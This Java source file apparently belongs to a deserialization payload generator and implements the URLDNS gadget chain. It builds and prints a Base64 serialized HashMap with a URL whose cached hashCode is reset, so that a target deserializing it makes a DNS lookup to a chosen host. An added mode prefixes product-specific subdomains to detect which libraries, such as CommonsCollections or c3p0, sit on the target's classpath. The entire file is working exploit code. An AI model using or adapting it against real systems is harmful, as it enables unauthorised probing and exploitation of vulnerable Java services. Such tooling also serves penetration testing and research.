package com.ppp.chain.urldns;

import com.ppp.ObjectPayload;
import com.ppp.Printer;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.ppp.utils.Serializer;
import javassist.ClassPool;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

/**
 * @author Whoopsunix
 * <p>
 * Gadget Chain:
 * HashMap.readObject()
 * HashMap.putVal()
 * HashMap.hash()
 * URL.hashCode()
 */
@Sink({Sink.URLDNS})
public class URLDNS implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        DNSHelper dnsHelper = new DNSHelper();
        dnsHelper.setHost("");
        ArrayList<String> products = new ArrayList<String>();
//        products.add("all");
//        products.add("CommonsCollections3");
//        products.add("CommonsCollections4");
//        products.add("bcel");
//        products.add("c3p0");
        dnsHelper.setProducts(products);

//        dnsHelper.setClassName("com.ppp.KickOffn");
//        dnsHelper.setSubdomain("ctf");

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setDnsHelper(dnsHelper);
        Object object = new URLDNS().getObject(sinksHelper);
        String s = Serializer.serializeBase64(object);
        System.out.println(s);


        PayloadRunner.run(URLDNS.class, dnsHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        DNSHelper dnsHelper = sinksHelper.getDnsHelper();

        Object kickOffObject = getChainScheduler(dnsHelper);

        return kickOffObject;
    }

    public Object getChainScheduler(DNSHelper dnsHelper) throws Exception {
        Object kickOffObject = null;

        ArrayList<String> products = dnsHelper.getProducts();

        if (products == null || products.isEmpty()) {
            Printer.blueInfo("No product specified, using default URLDNS gadget");
            kickOffObject = getChain(hostFormat(dnsHelper.getHost(), null));
        } else if (dnsHelper.getClassName() != null && dnsHelper.getSubdomain() != null) {
            String subdomain = dnsHelper.getSubdomain();
            String className = dnsHelper.getClassName();
            Class clazz = getClass(className);
            Object kick = getChain(hostFormat(dnsHelper.getHost(), subdomain), clazz);
            kickOffObject = kick;
            Printer.yellowInfo(String.format("Subdomain: %s  -->  Custom Class: %s", subdomain, className));
        } else {
            // 导入全部
            if (products.get(0).equalsIgnoreCase("all")) {
                Product[] values = Product.values();
                ArrayList<String> tproducts = new ArrayList<String>();
                for (Product value : values) {
                    tproducts.add(value.getLongProduct());
                }
                products = tproducts;
            }

            Printer.blueInfo("Detect products: " + products);
            List<Object> kickList = new LinkedList<Object>();
            for (String product : products) {
                Product productEnum = Product.getProduct(product);
                if (productEnum == null) {
                    continue;
                }
                for (Subdomain subdomainEnum : Subdomain.values()) {
                    if (subdomainEnum.getProduct().equalsIgnoreCase(productEnum.getLongProduct())) {
                        String subdomain = subdomainEnum.getSubdomain();
                        String className = subdomainEnum.getClassName();
                        try {
                            Class clazz = getClass(className);
                            if (clazz != null) {
                                Object kick = getChain(hostFormat(dnsHelper.getHost(), subdomain), clazz);
                                kickList.add(kick);
                            }
                        } catch (Exception e) {

                        }
                        Printer.yellowInfo(String.format("Subdomain: %s  -->  Class: %s", subdomain, className));
                    }
                }
            }
            kickOffObject = kickList;
        }

        return kickOffObject;
    }


    /**
     * 原始
     *
     * @param url
     * @return
     * @throws Exception
     */
    public Object getChain(String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap();
        URL u = new URL(null, url, handler);
        ht.put(u, url);

        Reflections.setFieldValue(u, "hashCode", -1);

        return ht;
    }

    /**
     * 类探测
     *
     * @param url
     * @param cls
     * @return
     * @throws Exception
     */
    public Object getChain(String url, Class cls) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap();
        URL u = new URL(null, url, handler);
        ht.put(u, cls);

        Reflections.setFieldValue(u, "hashCode", -1);

        return ht;
    }

    public Class getClass(String className) {
        Class clazz = null;
        try {
            try {
                clazz = ClassPool.getDefault().makeClass(className).toClass();
            } catch (Exception e) {
                clazz = Class.forName(className);
            }
        } catch (Exception e) {

        }
        return clazz;
    }

    public String hostFormat(String host, String subdomain) {
        if (subdomain != null) {
            host = subdomain + "." + host;
        }
        // host 格式化
        if (!host.startsWith("http://") && !host.startsWith("https://")) {
            host = "http://" + host;
        }
        return host;
    }

    public static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}